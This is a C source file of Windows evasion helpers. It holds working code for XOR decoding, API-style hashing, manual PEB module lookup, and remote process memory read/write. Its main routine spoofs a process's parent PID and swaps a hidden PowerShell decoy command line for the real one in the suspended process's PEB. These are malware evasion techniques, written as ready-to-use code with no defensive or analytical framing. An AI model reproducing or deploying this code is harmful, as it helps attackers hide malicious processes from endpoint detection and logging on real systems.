#include "helper.h"

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz) {
    for (size_t i = 0; i < data_sz; i++) {
        data[i] ^= key[i % key_sz];
    }
}

void hexdump(char *data, size_t size) {
    const size_t width = 16;

    for (size_t i = 0; i < size; i += width) {
        printf("%08zx  ", i);

        for (size_t j = 0; j < width; j++) {
            if (i + j < size)
                printf("%02X ", (unsigned char)data[i + j]);
            else
                printf("   ");
        }
        printf(" ");
        for (size_t j = 0; j < width; j++) {
            if (i + j < size) {
                unsigned char c = data[i + j];
                printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
        }
        printf("\n");
    }
}

DWORD Djb2W(BYTE* Data) {
    ULONG Hash = 0x67 + 0x420;
    INT c;

    while(c = *Data++) {
        Hash = ((Hash << 6) + Hash) + c;
    }

    return Hash;
}

int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID){
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to take snapshot\n");
        return 0;
    }

    if (!Process32First(snapshot, &pe32)) {
        printf("[-] Failed to get first process\n");
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (strcmpi(pe32.szExeFile, lpName) == 0) {
            printf("[+] Found ! PID: %u - %s\n", pe32.th32ProcessID, pe32.szExeFile);
            *PID = pe32.th32ProcessID;
            *hProc = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return 1;
}
HMODULE CustomGetModuleHandleW(LPCWSTR moduleName){
    HMODULE hModule = 0;
    size_t moduleName_sz = lstrlenW(moduleName);   

    //TEB (GS:0x30) + offset PEB (0x30)
    printf("[*] Getting PEB via GS+offset(0x60)\n");
    PPEB pPeb = (PPEB)__readgsqword(0x60); // PPEB ProcessEnvironmentBlock;

    printf("[*] Getting PEB_LDR_DATA via PEB\n");
    PPEB_LDR_DATA Ldr = pPeb->Ldr;//PPEB_LDR_DATA LoaderData

    PLIST_ENTRY _InMemoryOrderModuleList = &Ldr->InMemoryOrderModuleList;
    printf("[*] Getting lists of _LDR_DATA_TABLE_ENTRY via LoaderData::InMemoryOrderModuleList\n");
    printf("[*] Iterating InMemoryOrderModuleList\n");
    int DoneFlag = 0;
    for (PLIST_ENTRY currElem = _InMemoryOrderModuleList->Flink; (currElem != _InMemoryOrderModuleList) && !DoneFlag; currElem = currElem->Flink){
        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)currElem - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        LPCWSTR BaseName = wcsrchr(entry->FullDllName.Buffer, L'\\')+1;

        if (!_wcsnicmp(moduleName, BaseName, moduleName_sz)) { //Case insensitive
            printf("[*] Found Module '%ls' !\n", moduleName);
            printf("[*] %ls DllBase (HMODULE) : 0x%p \n", BaseName, entry->DllBase);
            hModule = (HMODULE)entry->DllBase;
            DoneFlag = 1;
        } else printf("[Debug] Skiping '%ls' ('%ls')\n", BaseName, entry->FullDllName.Buffer);
    } 

    return hModule;
}

LPCWSTR ConvertDataToLPCWSTR(BYTE* Data) {
    if (!Data) return NULL;
    int dataSize = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, NULL, 0);
    LPWSTR dataW = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dataSize * sizeof(WCHAR));
    if (dataW) {
        MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, dataW, dataSize);
    }
    return (LPCWSTR)dataW;
}

BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize) {
    HANDLE hHeap = GetProcessHeap();
    *ppReadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
    
    if (*ppReadBuffer == NULL) return FALSE;

    SIZE_T sNmbrOfBytesRead = 0;
    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead)) {
        printf("[!] ReadProcessMemory Failed : %u\n", GetLastError());
        HeapFree(hHeap, 0, *ppReadBuffer);
        *ppReadBuffer = NULL;
        return FALSE;
    }
    return TRUE;
}

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten  = 0;

    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        printf("[!] WriteProcessMemory Failed With Error : %u \n", GetLastError());
        printf("[i] Bytes Written : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesWritten, (unsigned long long)dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPCWSTR procCmdLine) {
    STARTUPINFOEXW SiEx = { 0 };
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    HANDLE hHeap = GetProcessHeap();

    printf("[*] Spoofing PPID of %s\n", lpSpoofedProcPath);
    DWORD PID = 0;
    HANDLE hParentProcess = NULL;
    
    char *filename = strrchr(lpSpoofedProcPath, '\\');
    filename = (filename == NULL) ? (char *)lpSpoofedProcPath : filename + 1;
    
    get_process(filename, &hParentProcess, &PID);
    if (!hParentProcess) {
        printf("[!] Failed to get parent process handle\n");
        return FALSE;
    }

    printf("[*] %s PID : %d\n", filename, PID);

    SIZE_T sThreadAttList = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
    
    InitializeProcThreadAttributeList(NULL, 1, 0, &sThreadAttList);
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttList);
    
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &sThreadAttList)) return FALSE;
    
    UpdateProcThreadAttribute(pThreadAttList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
    SiEx.lpAttributeList = pThreadAttList;
    
    printf("[*] Starting process with Fake PPID...\n");
    
    // Buffer large pour éviter les débordements
    WCHAR fakeStartupArgs[1024] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";
    
    if (!CreateProcessW(NULL, fakeStartupArgs, NULL, NULL, FALSE, 
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, 
        NULL, NULL, &SiEx.StartupInfo, Pi)) {
        printf("[!] CreateProcessW Failed: %d\n", GetLastError());
        HeapFree(hHeap, 0, pThreadAttList);
        return FALSE;
    }

    // Résolution NtQuery
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    
    PROCESS_BASIC_INFORMATION PBI = { 0 };
    ULONG ret = 0;
    pNtQueryInformationProcess(Pi->hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);

    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;
    
    if (!ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) goto cleanup;

    // Lecture des paramètres distants
    if (!ReadFromTargetProcess(Pi->hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0x100)) goto cleanup;
    
    SIZE_T effectiveArgs_bsz = (lstrlenW(procCmdLine) + 1) * sizeof(WCHAR); 
    
    printf("[*] Updating CommandLine.Buffer at %p\n", pParms->CommandLine.Buffer);
    WriteToTargetProcess(Pi->hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)procCmdLine, effectiveArgs_bsz);

    BYTE* remoteParamsBase = (BYTE*)pPeb->ProcessParameters;
    USHORT effectiveArgs_sz_us = (USHORT)effectiveArgs_bsz; 
    
    WriteToTargetProcess(Pi->hProcess, remoteParamsBase + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), &effectiveArgs_sz_us, sizeof(USHORT));
    WriteToTargetProcess(Pi->hProcess, remoteParamsBase + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength), &effectiveArgs_sz_us, sizeof(USHORT));

    printf("[*] Process manipulation done !\n");

cleanup:

    if(pPeb) HeapFree(hHeap, 0, pPeb);
    if(pParms) HeapFree(hHeap, 0, pParms);
    if(pThreadAttList) {
        DeleteProcThreadAttributeList(pThreadAttList);
        HeapFree(hHeap, 0, pThreadAttList);
    }
    
    return TRUE;
}